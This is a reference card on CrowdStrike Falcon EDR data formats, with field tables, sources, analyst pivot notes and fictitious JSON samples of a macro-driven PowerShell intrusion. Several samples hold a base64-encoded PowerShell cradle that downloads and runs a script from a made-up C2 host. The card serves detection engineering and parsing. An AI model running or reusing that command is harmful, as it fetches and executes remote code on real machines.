# EDR — CrowdStrike Falcon (Insight / Prevent)

Category: EDR · Vendor: CrowdStrike · Card status: researched 2026-10-01

Two native representations exist and they are NOT interchangeable:

| Stream | What it is | Shape |
|---|---|---|
| **Falcon Data Replicator (FDR)** | Raw sensor telemetry (every process, DNS, network, file event) | Flat JSON, one object per line, **every value is a string**, PascalCase keys + a few lower-case keys (`aid`, `cid`, `aip`, `event_simpleName`, `event_platform`, `timestamp`, `name`, `id`) |
| **Alerts API v2** (`/alerts/entities/alerts/v2`) | Detection / alert objects (replaced the decommissioned Detects API) | Nested JSON, **snake_case** keys, typed values (ints, bools, arrays), ISO-8601 timestamps |
| Event Streams (`DetectionSummaryEvent` legacy / `EppDetectionSummaryEvent` current) | Push stream of detections to SIEM connectors | `{"metadata":{...},"event":{...}}`, **PascalCase** keys, typed values, epoch-seconds times |

Platform rule: telemetry events (process / DNS / network / file) are rendered as **FDR** objects; the alert
object is rendered as an **Alerts API v2** resource. Event Streams form is documented as an alternative
detection feed — never mix its PascalCase fields into an Alerts API object or vice versa.

---

## 1. Official / primary sources consulted

| URL | What it confirmed |
|---|---|
| https://developer.crowdstrike.com/api-reference/collections/alerts/ | Alerts service collection: `GetQueriesAlertsV2`, `PostEntitiesAlertsV2` (`/alerts/entities/alerts/v2`), `PatchEntitiesAlertsV3`, `PostAggregatesAlertsV2`; response envelope `meta` / `resources` / `errors`; update actions `update_status`, `assign_to_name`, `append_comment`, `add_tag`, `show_in_ui`, `unassign`; status values `in_progress`, `reopened` listed for updates |
| https://developer.crowdstrike.com/api-reference/collections/detects/ + https://docs.cloud.google.com/chronicle/docs/detection/migrate-detects-api-to-alerts-api + https://security.googlecloudcommunity.com/news-announcements-9/important-advisory-decommissioning-of-crowdstrike-s-detects-api-5923 | Detects API deprecated 2024-10-01, decommissioned 2025-09-30 → Alerts API is the current detection API |
| https://github.com/elastic/integrations/blob/main/packages/crowdstrike/data_stream/fdr/_dev/test/pipeline/test-windows.log and `test-fdr.log` | Raw FDR objects (pre-parsing) for Win/Mac/Lin: `ProcessRollup2`, `SyntheticProcessRollup2`, `NetworkConnectIP4`, `DnsRequest`, `PeFileWritten`, `NewExecutableWritten`, `NewScriptWritten`, `UserLogon`, `AgentOnline` etc. Confirms all values are strings, `timestamp` = epoch-ms string, `ProcessStartTime`/`ContextTimeStamp` = `"<epoch-sec>.<ms>"` strings, `ImageFileName` uses `\Device\HarddiskVolumeN\...`, `ComputerName` is NOT on ProcessRollup2 (it is on `AgentOnline`/aidmaster) |
| https://github.com/elastic/integrations/blob/main/packages/crowdstrike/data_stream/fdr/_dev/test/pipeline/test-fdr-epp-detection-summary.log | FDR also carries `EppDetectionSummaryEvent` with `ExternalApiType:"Event_EppDetectionSummaryEvent"` |
| https://github.com/elastic/integrations/blob/main/packages/crowdstrike/data_stream/alert/_dev/test/pipeline/test-alert.log | Raw Alerts API v2 resources: full key list (`composite_id`, `aggregate_id`, `agent_id`, `cid`, `cmdline`, `device{}`, `parent_details{}`, `grandparent_details{}`, `pattern_disposition`, `pattern_disposition_details{}`, `severity`, `severity_name`, `status`, `product`, `type`, `tactic`/`tactic_id`, `technique`/`technique_id`, `falcon_host_link`, `quarantined_files[]` ...). Product values seen: `epp`, `idp`, `overwatch`, `fcs`; type values `ldt`, `idp-user-endpoint-app-info`, `lead`, `cloud-ioa` |
| https://github.com/elastic/integrations/tree/main/packages/crowdstrike/data_stream/falcon/_dev/test/pipeline (`test-falcon-epp-detection-summary.log`, `test-falcon-detection-summary.log`) | Event Streams envelope `{"metadata":{"customerIDString","offset","eventType","eventCreationTime","version"},"event":{...}}`; legacy `DetectionSummaryEvent` (`DetectName`, `DetectDescription`, `ComputerName`, `SensorId`, `DetectId`, `NetworkAccesses[]`) vs current `EppDetectionSummaryEvent` (`Name`, `Description`, `Hostname`, `AgentId`, `CompositeId`, `AggregateId`) |

Not publicly reachable: the Falcon Event Data Dictionary (falcon.crowdstrike.com/documentation, login only). Field
semantics below that come from community knowledge rather than a retrieved document are marked **UNVERIFIED**.

---

## 2. Native format & delivery path

- **FDR**: CrowdStrike writes gzip'd newline-delimited JSON to a CrowdStrike-hosted S3 bucket + SQS notification
  queue; the customer's collector (SIEM S3 input, FDR python consumer) pulls it. One JSON object per line, flat,
  no envelope. Telemetry under `data/`, host/user lookup tables (`aidmaster`, `managedassets`, `userinfo`) under
  separate prefixes. Falcon Next-Gen SIEM / LogScale and Falcon Event Search show the same field names (Event Search
  prefixes the type as `#event_simpleName` in LogScale syntax).
- **Alerts API v2**: pull. `GET /alerts/queries/alerts/v2?filter=...` returns composite IDs; `POST /alerts/entities/alerts/v2`
  with `{"composite_ids":[...]}` returns `{"meta":{...},"resources":[ <alert>, ... ],"errors":[]}`. We render ONE element of `resources`.
- **Event Streams**: long-lived HTTPS stream (`/sensors/entities/datafeed/v2`), each line `{"metadata":...,"event":...}`.

Why: FDR is the only native per-event telemetry (process tree, DNS, sockets, file writes) and Alerts API v2 is the
current, supported detection object. Event Streams is accepted for detections only.

---

## 3. Core field reference

### 3a. FDR common fields (every event)

| Field | Type (as delivered) | Meaning | Example / values |
|---|---|---|---|
| `event_simpleName` | string | Event type | `ProcessRollup2`, `SyntheticProcessRollup2`, `EndOfProcess`, `DnsRequest`, `SuspiciousDnsRequest`, `NetworkConnectIP4`, `NetworkConnectIP6`, `NetworkListenIP4`, `NetworkReceiveAcceptIP4`, `PeFileWritten`, `NewExecutableWritten`, `NewScriptWritten`, `GenericFileWritten`, `OoxmlFileWritten`, `ZipFileWritten`, `ExecutableDeleted`, `UserLogon`, `UserLogonFailed2`, `UserIdentity`, `AsepValueUpdate`/`AsepFileChange`, `RegSystemConfigValueUpdate`, `ServiceStarted`, `DriverLoad`, `ClassifiedModuleLoad`, `AgentOnline`, `SensorHeartbeat`, `EppDetectionSummaryEvent` |
| `name` | string | Versioned event name | `ProcessRollup2V19`, `DnsRequestV4`, `NetworkConnectIP4V5` |
| `aid` | string (32 hex) | Agent (sensor) ID = host identity | `4d92d2adf9009775a446ce0fe2689915` |
| `cid` | string (32 hex) | Customer ID | `c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b` |
| `aip` | string | Host's external IP as seen by the cloud | `213.57.121.34` |
| `event_platform` | string | OS family | `Win`, `Mac`, `Lin` |
| `timestamp` | string (epoch ms) | Cloud receive time | `"1790669662417"` |
| `id` | string (UUID) | Event UUID | `"6a1f0c9e-9b42-11f1-8a6e-02b7c41d5e21"` |
| `ConfigBuild`, `ConfigStateHash`, `Entitlements`, `EffectiveTransmissionClass` | string | Sensor build/config metadata | `"1007.3.0019807.1"`, `"15"`, `"3"` |

### 3b. ProcessRollup2 (process start)

| Field | Type | Meaning | Example |
|---|---|---|---|
| `TargetProcessId` | string (decimal) | Falcon-unique ID of **this** process (UPID) | `"289741187433"` |
| `ParentProcessId` | string | `TargetProcessId` of the parent | `"289734651298"` |
| `SourceProcessId` / `SourceThreadId` | string | Process/thread that caused the create (usually = parent) | |
| `RawProcessId` | string | OS PID | `"7412"` |
| `ImageFileName` | string | Full image path in NT device form | `\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| `CommandLine` | string | Full command line | |
| `ParentBaseFileName` | string | Parent image file name only | `WINWORD.EXE` |
| `SHA256HashData`, `SHA1HashData`, `MD5HashData` | string | Image hashes (SHA1 often all zeros on Windows) | 64 / 40 / 32 hex |
| `UserSid` | string | Token user SID | `S-1-5-21-...-1604` |
| `AuthenticationId` / `ParentAuthenticationId` | string | Logon ID (LUID) | `"2338751"`, `"999"` = SYSTEM |
| `IntegrityLevel` | string (decimal of RID) | `4096` Low, `8192` Medium, `12288` High, `16384` System | `"8192"` |
| `TokenType` | string | `1` primary, `2` impersonation | `"1"` |
| `SessionId` | string | Windows session | `"1"` |
| `ProcessStartTime` / `ProcessEndTime` | string `"<sec>.<ms>"` | Process start / end (end empty on PR2) | `"1790669662.402"`, `""` |
| `ImageSubsystem` | string | `2` GUI, `3` console | `"3"` |
| `ProcessCreateFlags`, `ProcessParameterFlags`, `ProcessSxsFlags`, `WindowFlags`, `SignInfoFlags` | string | Bitmasks | |
| `Tags` | string | Comma list of internal tag IDs | |

### 3c. Context events (DNS / network / file)

| Field | Type | Meaning |
|---|---|---|
| `ContextProcessId` | string | `TargetProcessId` of the process that performed the action → join to ProcessRollup2.`TargetProcessId` |
| `ContextThreadId` | string | Acting thread |
| `ContextTimeStamp` | string `"<sec>.<ms>"` | Sensor-side time of the action (use this for timelines, not `timestamp`) |
| `ContextBaseFileName` | string | Acting process file name (newer sensors) |
| `DomainName` (DnsRequest) | string | Queried name |
| `RequestType` (DnsRequest) | string | DNS QTYPE number: `1` A, `5` CNAME, `28` AAAA, `16` TXT |
| `IP4Records`, `FirstIP4Record`, `CNAMERecords`, `RespondingDnsServer`, `QueryStatus`, `DualRequest`, `DnsRequestCount`, `InterfaceIndex` (DnsRequest) | string | Answer data (`IP4Records` is `;`-separated with trailing `;`) |
| `LocalAddressIP4`, `LocalPort`, `RemoteAddressIP4`, `RemotePort` (NetworkConnectIP4) | string | Socket 4-tuple |
| `Protocol` | string | IANA number: `6` TCP, `17` UDP |
| `ConnectionDirection` | string | `0` outbound, `1` inbound — **UNVERIFIED** (2 = neither/unknown also reported in the community) |
| `ConnectionFlags`, `InContext` | string | Flags |
| `TargetFileName` (file events) | string | Written file, NT device path |
| `SHA256HashData`, `Size`, `FileIdentifier`, `IsOnNetwork`, `IsOnRemovableDisk`, `FileOperatorSid`, `UserName` (PeFileWritten) | string | File details; hash may be absent on some write events |

### 3d. Alerts API v2 resource (detection)

| Field | Type | Meaning / values |
|---|---|---|
| `composite_id` | string | Primary key: `<cid>:ind:<aid>:<process_id>-<pattern_id>-<n>` (EPP) |
| `id` / `indicator_id` | string | `ind:<aid>:<process_id>-<pattern_id>-<n>` |
| `aggregate_id` | string | `aggind:<aid>:<tree id>` — groups alerts of one process tree |
| `agent_id`, `cid` | string | Host / customer |
| `product` | string | `epp` (endpoint), `idp` (identity), `overwatch`, `fcs` (cloud), `ngsiem`, `xdr`… |
| `type` | string | `ldt` (endpoint "lightweight detection"), `lead` (OverWatch), `cloud-ioa`, `idp-user-endpoint-app-info` |
| `name`, `display_name`, `description` | string | Detection pattern name + text |
| `severity` / `severity_name` | int 0-100 / string | `10` Informational, `30` Low, `50`/`40` Medium, `70` High, `90` Critical (bands; exact cut-offs **UNVERIFIED**) |
| `confidence` | int | 0-100 |
| `status` | string | `new`, `in_progress`, `closed`, `reopened` (`closed` from Falcon UI usage — not in the retrieved page, **UNVERIFIED**) |
| `tactic`, `tactic_id`, `technique`, `technique_id`, `objective` | string | MITRE (`TA0002`, `T1059.001`) or CrowdStrike-specific (`CSTA0004`, `CST0000`) |
| `scenario` | string | `suspicious_activity`, `NGAV`, `known_malware`, `intel_detection`, `attacker_methodology` … |
| `pattern_id` | int | Detection logic ID |
| `pattern_disposition` / `pattern_disposition_description` / `pattern_disposition_details{}` | int / string / object of bools | What the sensor did: `kill_process`, `process_blocked`, `quarantine_file`, `quarantine_machine`, `operation_blocked`, `policy_disabled`, `detect`, … |
| `process_id`, `parent_process_id`, `local_process_id` | string | Falcon UPID, parent UPID, OS PID |
| `cmdline`, `filename`, `filepath`, `sha256`, `md5`, `sha1`, `user_name`, `user_id`, `logon_domain` | string | Triggering process |
| `parent_details{}`, `grandparent_details{}` | object | `cmdline`, `filename`, `filepath`, `local_process_id`, `md5`, `sha256`, `process_graph_id`, `process_id`, `timestamp`, `user_graph_id`, `user_id`, `user_name` |
| `device{}` | object | `device_id`, `hostname`, `local_ip`, `external_ip`, `mac_address`, `machine_domain`, `os_version`, `platform_name`, `product_type_desc`, `agent_version`, `ou[]`, `site_name`, `status`, `groups[]`, `first_seen`, `last_seen` … |
| `timestamp`, `created_timestamp`, `updated_timestamp`, `context_timestamp`, `crawled_timestamp` | string (ISO-8601) | Detection / alert lifecycle times |
| `falcon_host_link` | string | Console deep link |
| `ioc_type`, `ioc_value`, `ioc_source`, `ioc_description`, `ioc_context[]` | string / array | IOC that fired (when IOC-based) |
| `quarantined_files[]`, `source_products[]`, `source_vendors[]`, `data_domains[]`, `show_in_ui`, `tree_id`, `tree_root`, `control_graph_id`, `triggering_process_graph_id` | mixed | |

---

## 4. Realistic JSON samples (fictitious)

Story: on 2026-09-29 user `dana.levi` on `FIN-WS-0142` (NEXACORP) opens a malicious Word document. WINWORD spawns
encoded PowerShell, which resolves and connects to `cdn-update-sync.com` (185.225.73.41:443) and drops `msupd.exe`.

### 4.1 FDR — ProcessRollup2 (encoded PowerShell from Word)

```json
{"AuthenticationId":"2338751","CommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA=","ConfigBuild":"1007.3.0019807.1","ConfigStateHash":"2873364105","EffectiveTransmissionClass":"3","Entitlements":"15","EventOrigin":"1","ImageFileName":"\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ImageSubsystem":"3","IntegrityLevel":"8192","MD5HashData":"6ac5e4c66d56a4c2a2fab09e18bcc23f","ParentAuthenticationId":"2338751","ParentBaseFileName":"WINWORD.EXE","ParentProcessId":"289734651298","ProcessCreateFlags":"1024","ProcessEndTime":"","ProcessParameterFlags":"24577","ProcessStartTime":"1790669662.402","ProcessSxsFlags":"64","RawProcessId":"7412","SHA1HashData":"0000000000000000000000000000000000000000","SHA256HashData":"9cedee4eca1b34434ccdd654da4faf4c7ca7a723eaab248e4ff9717db26a1f55","SessionId":"1","SourceProcessId":"289734651298","SourceThreadId":"118473902216","TargetProcessId":"289741187433","TokenType":"1","UserSid":"S-1-5-21-3623811015-3361044348-30300820-1604","WindowFlags":"128","aid":"4d92d2adf9009775a446ce0fe2689915","aip":"213.57.121.34","cid":"c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b","event_platform":"Win","event_simpleName":"ProcessRollup2","id":"6a1f0c9e-9b42-11f1-8a6e-02b7c41d5e21","name":"ProcessRollup2V19","timestamp":"1790669662417"}
```

### 4.2 FDR — DnsRequest (PowerShell resolves C2)

```json
{"ConfigBuild":"1007.3.0019807.1","ConfigStateHash":"2873364105","ContextBaseFileName":"powershell.exe","ContextProcessId":"289741187433","ContextThreadId":"118473955081","ContextTimeStamp":"1790669663.051","DnsRequestCount":"1","DnsResponseType":"1","DomainName":"cdn-update-sync.com","DualRequest":"0","EffectiveTransmissionClass":"3","Entitlements":"15","EventOrigin":"1","FirstIP4Record":"185.225.73.41","IP4Records":"185.225.73.41;","InterfaceIndex":"0","QueryStatus":"0","RequestType":"1","RespondingDnsServer":"10.20.0.10","aid":"4d92d2adf9009775a446ce0fe2689915","aip":"213.57.121.34","cid":"c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b","event_platform":"Win","event_simpleName":"DnsRequest","id":"6a2c7d41-9b42-11f1-9d13-02b7c41d5e21","name":"DnsRequestV4","timestamp":"1790669663188"}
```

### 4.3 FDR — NetworkConnectIP4 (outbound to C2)

```json
{"ConfigBuild":"1007.3.0019807.1","ConfigStateHash":"2873364105","ConnectionDirection":"0","ConnectionFlags":"0","ContextBaseFileName":"powershell.exe","ContextProcessId":"289741187433","ContextThreadId":"118473955081","ContextTimeStamp":"1790669663.212","EffectiveTransmissionClass":"3","Entitlements":"15","EventOrigin":"1","InContext":"0","LocalAddressIP4":"10.20.14.87","LocalPort":"52817","Protocol":"6","RemoteAddressIP4":"185.225.73.41","RemotePort":"443","aid":"4d92d2adf9009775a446ce0fe2689915","aip":"213.57.121.34","cid":"c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b","event_platform":"Win","event_simpleName":"NetworkConnectIP4","id":"6a2f13b8-9b42-11f1-b5a0-02b7c41d5e21","name":"NetworkConnectIP4V5","timestamp":"1790669663341"}
```

### 4.4 FDR — PeFileWritten (dropped payload)

```json
{"AuthenticationId":"2338751","ConfigBuild":"1007.3.0019807.1","ConfigStateHash":"2873364105","ContextBaseFileName":"powershell.exe","ContextImageFileName":"\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ContextProcessId":"289741187433","ContextThreadId":"118473955081","ContextTimeStamp":"1790669665.880","EffectiveTransmissionClass":"3","Entitlements":"15","EventOrigin":"1","FileIdentifier":"7a1c3e5f0b2d4f6e8a9c1b3d5e7f9a0b2c4d6e8f0a1b3c5d","FileOperatorSid":"S-1-5-21-3623811015-3361044348-30300820-1604","IsOnNetwork":"0","IsOnRemovableDisk":"0","IsTransactedFile":"0","SHA256HashData":"e3375bf9704fd511dd71fdd683ae439adfa8b22e697c1853d148c8ae0e627aed","Size":"318464","TargetFileName":"\\Device\\HarddiskVolume3\\ProgramData\\Microsoft\\Update\\msupd.exe","TokenType":"1","UserName":"dana.levi","aid":"4d92d2adf9009775a446ce0fe2689915","aip":"213.57.121.34","cid":"c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b","event_platform":"Win","event_simpleName":"PeFileWritten","id":"6a4e90d2-9b42-11f1-8c77-02b7c41d5e21","name":"PeFileWrittenV14","timestamp":"1790669666007"}
```

### 4.5 Alerts API v2 — one element of `resources` (endpoint IOA alert)

```json
{
  "agent_id": "4d92d2adf9009775a446ce0fe2689915",
  "aggregate_id": "aggind:4d92d2adf9009775a446ce0fe2689915:12884902151",
  "alleged_filetype": "exe",
  "cid": "c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b",
  "cloud_indicator": "false",
  "cmdline": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA=",
  "composite_id": "c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b:ind:4d92d2adf9009775a446ce0fe2689915:289741187433-10197-1843209",
  "confidence": 80,
  "context_timestamp": "2026-09-29T08:14:22.402Z",
  "control_graph_id": "ctg:4d92d2adf9009775a446ce0fe2689915:12884902151",
  "created_timestamp": "2026-09-29T08:14:31.885124513Z",
  "data_domains": ["Endpoint"],
  "description": "An Office application launched PowerShell with an encoded command line. This is consistent with a malicious macro or embedded object. Review the process tree.",
  "device": {
    "agent_load_flags": "0",
    "agent_local_time": "2026-09-29T06:02:11.204Z",
    "agent_version": "7.29.19807.0",
    "cid": "c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b",
    "config_id_base": "65994763",
    "config_id_build": "19807",
    "config_id_platform": "3",
    "device_id": "4d92d2adf9009775a446ce0fe2689915",
    "external_ip": "213.57.121.34",
    "first_seen": "2025-11-03T09:41:27Z",
    "groups": ["5b8e2c41a9d74f30b6e1c0d29f7a3e84"],
    "hostinfo": {"active_directory_dn_display": ["Workstations", "Workstations\\Finance"], "domain": "NEXACORP.LOCAL"},
    "hostname": "FIN-WS-0142",
    "last_seen": "2026-09-29T08:12:58Z",
    "local_ip": "10.20.14.87",
    "mac_address": "3c-52-82-a1-6f-0d",
    "machine_domain": "NEXACORP.LOCAL",
    "major_version": "10",
    "minor_version": "0",
    "modified_timestamp": "2026-09-29T08:13:04Z",
    "os_version": "Windows 11",
    "ou": ["Finance", "Workstations"],
    "platform_id": "0",
    "platform_name": "Windows",
    "product_type": "1",
    "product_type_desc": "Workstation",
    "site_name": "TLV-HQ",
    "status": "normal",
    "system_manufacturer": "Dell Inc.",
    "system_product_name": "Latitude 5440"
  },
  "falcon_host_link": "https://falcon.eu-1.crowdstrike.com/activity-v2/detections/c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b:ind:4d92d2adf9009775a446ce0fe2689915:289741187433-10197-1843209?_cid=c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b",
  "filename": "powershell.exe",
  "filepath": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "grandparent_details": {
    "cmdline": "C:\\Windows\\Explorer.EXE",
    "filename": "explorer.exe",
    "filepath": "\\Device\\HarddiskVolume3\\Windows\\explorer.exe",
    "local_process_id": "4128",
    "md5": "8a64f4da916c9f0e727104dc202168a3",
    "process_graph_id": "pid:4d92d2adf9009775a446ce0fe2689915:289712004871",
    "process_id": "289712004871",
    "sha256": "2217604cf31513e40cf073832b874cd3ff50bfe3ee77ddaa7172e443501749f6",
    "timestamp": "2026-09-29T06:03:40Z",
    "user_graph_id": "uid:4d92d2adf9009775a446ce0fe2689915:S-1-5-21-3623811015-3361044348-30300820-1604",
    "user_id": "S-1-5-21-3623811015-3361044348-30300820-1604",
    "user_name": "dana.levi"
  },
  "id": "ind:4d92d2adf9009775a446ce0fe2689915:289741187433-10197-1843209",
  "indicator_id": "ind:4d92d2adf9009775a446ce0fe2689915:289741187433-10197-1843209",
  "local_process_id": "7412",
  "logon_domain": "NEXACORP",
  "md5": "6ac5e4c66d56a4c2a2fab09e18bcc23f",
  "name": "OfficeSpawnedEncodedPowerShell",
  "objective": "Follow Through",
  "parent_details": {
    "cmdline": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\dana.levi\\Downloads\\Invoice_Q3_2026.docm\" /o \"\"",
    "filename": "WINWORD.EXE",
    "filepath": "\\Device\\HarddiskVolume3\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "local_process_id": "5216",
    "md5": "b5427130eb0bcfc6bcbefd3d44f12104",
    "process_graph_id": "pid:4d92d2adf9009775a446ce0fe2689915:289734651298",
    "process_id": "289734651298",
    "sha256": "a80227f8606831d42d3535415b73721e08daf506051e2ec1ab7d4994d88780ca",
    "timestamp": "2026-09-29T08:11:05Z",
    "user_graph_id": "uid:4d92d2adf9009775a446ce0fe2689915:S-1-5-21-3623811015-3361044348-30300820-1604",
    "user_id": "S-1-5-21-3623811015-3361044348-30300820-1604",
    "user_name": "dana.levi"
  },
  "parent_process_id": "289734651298",
  "pattern_disposition": 0,
  "pattern_disposition_description": "Detection, standard detection.",
  "pattern_disposition_details": {"blocking_unsupported_or_disabled": false, "bootup_safeguard_enabled": false, "critical_process_disabled": false, "detect": false, "fs_operation_blocked": false, "handle_operation_downgraded": false, "inddet_mask": false, "indicator": false, "kill_action_failed": false, "kill_parent": false, "kill_process": false, "kill_subprocess": false, "operation_blocked": false, "policy_disabled": false, "process_blocked": false, "quarantine_file": false, "quarantine_machine": false, "registry_operation_blocked": false, "rooting": false, "sensor_only": false, "suspend_parent": false, "suspend_process": false},
  "pattern_id": 10197,
  "platform": "Windows",
  "process_end_time": "",
  "process_id": "289741187433",
  "process_start_time": "1790669662",
  "product": "epp",
  "scenario": "suspicious_activity",
  "severity": 70,
  "severity_name": "High",
  "sha1": "0000000000000000000000000000000000000000",
  "sha256": "9cedee4eca1b34434ccdd654da4faf4c7ca7a723eaab248e4ff9717db26a1f55",
  "show_in_ui": true,
  "source_products": ["Falcon Insight"],
  "source_vendors": ["CrowdStrike"],
  "status": "new",
  "tactic": "Execution",
  "tactic_id": "TA0002",
  "technique": "PowerShell",
  "technique_id": "T1059.001",
  "timestamp": "2026-09-29T08:14:22.931Z",
  "tree_id": "12884902151",
  "tree_root": "289734651298",
  "triggering_process_graph_id": "pid:4d92d2adf9009775a446ce0fe2689915:289741187433",
  "type": "ldt",
  "updated_timestamp": "2026-09-29T08:14:31.885117302Z",
  "user_id": "S-1-5-21-3623811015-3361044348-30300820-1604",
  "user_name": "dana.levi"
}
```

### 4.6 Event Streams — EppDetectionSummaryEvent (alternative detection feed)

```json
{
  "metadata": {"customerIDString": "c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b", "offset": 884213, "eventType": "EppDetectionSummaryEvent", "eventCreationTime": 1790669671885, "version": "1.0"},
  "event": {
    "AgentId": "4d92d2adf9009775a446ce0fe2689915",
    "AggregateId": "aggind:4d92d2adf9009775a446ce0fe2689915:12884902151",
    "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA=",
    "CompositeId": "c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b:ind:4d92d2adf9009775a446ce0fe2689915:289741187433-10197-1843209",
    "DataDomains": "Endpoint",
    "Description": "An Office application launched PowerShell with an encoded command line. This is consistent with a malicious macro or embedded object. Review the process tree.",
    "FalconHostLink": "https://falcon.eu-1.crowdstrike.com/activity-v2/detections/c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b:ind:4d92d2adf9009775a446ce0fe2689915:289741187433-10197-1843209?_cid=c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b",
    "FileName": "powershell.exe",
    "FilePath": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "GrandParentCommandLine": "C:\\Windows\\Explorer.EXE",
    "GrandParentImageFileName": "explorer.exe",
    "GrandParentImageFilePath": "\\Device\\HarddiskVolume3\\Windows\\explorer.exe",
    "HostGroups": "5b8e2c41a9d74f30b6e1c0d29f7a3e84",
    "Hostname": "FIN-WS-0142",
    "LocalIP": "10.20.14.87",
    "LocalIPv6": "",
    "LogonDomain": "NEXACORP",
    "MACAddress": "3c-52-82-a1-6f-0d",
    "MD5String": "6ac5e4c66d56a4c2a2fab09e18bcc23f",
    "Name": "OfficeSpawnedEncodedPowerShell",
    "Objective": "Follow Through",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\dana.levi\\Downloads\\Invoice_Q3_2026.docm\" /o \"\"",
    "ParentImageFileName": "WINWORD.EXE",
    "ParentImageFilePath": "\\Device\\HarddiskVolume3\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentProcessId": 289734651298,
    "PatternDispositionDescription": "Detection, standard detection.",
    "PatternDispositionFlags": {"Indicator": false, "Detect": false, "InddetMask": false, "SensorOnly": false, "Rooting": false, "KillProcess": false, "KillSubProcess": false, "QuarantineMachine": false, "QuarantineFile": false, "PolicyDisabled": false, "KillParent": false, "OperationBlocked": false, "ProcessBlocked": false, "RegistryOperationBlocked": false, "CriticalProcessDisabled": false, "BootupSafeguardEnabled": false, "FsOperationBlocked": false, "HandleOperationDowngraded": false, "KillActionFailed": false, "BlockingUnsupportedOrDisabled": false, "SuspendProcess": false, "SuspendParent": false},
    "PatternDispositionValue": 0,
    "PatternId": 10197,
    "ProcessEndTime": 0,
    "ProcessId": 289741187433,
    "ProcessStartTime": 1790669662,
    "SHA1String": "0000000000000000000000000000000000000000",
    "SHA256String": "9cedee4eca1b34434ccdd654da4faf4c7ca7a723eaab248e4ff9717db26a1f55",
    "Severity": 70,
    "SeverityName": "High",
    "SourceProducts": "Falcon Insight",
    "SourceVendors": "CrowdStrike",
    "Tactic": "Execution",
    "Technique": "PowerShell",
    "Type": "ldt",
    "UserName": "dana.levi"
  }
}
```

---

## 5. Investigation notes (how an analyst pivots)

- **Process tree**: ProcessRollup2.`TargetProcessId` is the node ID. Child PR2.`ParentProcessId` = parent's
  `TargetProcessId`. Every action event (DnsRequest, NetworkConnectIP4, *FileWritten, registry events) carries
  `ContextProcessId` = `TargetProcessId` of the actor. So: alert `process_id` → PR2 `TargetProcessId` →
  all events with that `ContextProcessId` (DNS 4.2, socket 4.3, file 4.4) and all PR2 with that `ParentProcessId`.
- `RawProcessId` / alert `local_process_id` is the OS PID — it is reused by Windows; never join on it across time.
- Host pivot: `aid` (FDR) = `agent_id` / `device.device_id` (alert) = `AgentId` (Event Streams). Hostname is
  resolved via `aidmaster` (`ComputerName`) in FDR, `device.hostname` in alerts, `Hostname` in Event Streams.
- User pivot: PR2 `UserSid` → `UserIdentity`/`UserLogon` events (`UserName`, `LogonDomain`, `LogonType`) via the
  same `AuthenticationId` (logon LUID) on the same `aid`.
- Timeline: use `ContextTimeStamp` / `ProcessStartTime` (sensor time). `timestamp` is cloud arrival time and can
  lag by seconds.
- Alert grouping: `aggregate_id` (aggind:...) ties together alerts in one process tree; in the console this is the
  "Detection"/"Incident" process-tree view (Endpoint security → Endpoint detections, activity-v2 links).
- Console vocabulary: "Endpoint detections" (alerts), "Investigate → Event search" (FDR-equivalent telemetry,
  `#event_simpleName` in LogScale/NG-SIEM), "Process explorer / Process tree", "Network containment"
  (host isolation), "RTR" (Real Time Response), "IOA" (behavioural) vs "IOC" (hash/domain) detections,
  "OverWatch" (managed hunting; `product:"overwatch"`, `type:"lead"`).
- Hash pivot: FDR `SHA256HashData` = alert `sha256` = Event Streams `SHA256String` (three spellings of one value).

---

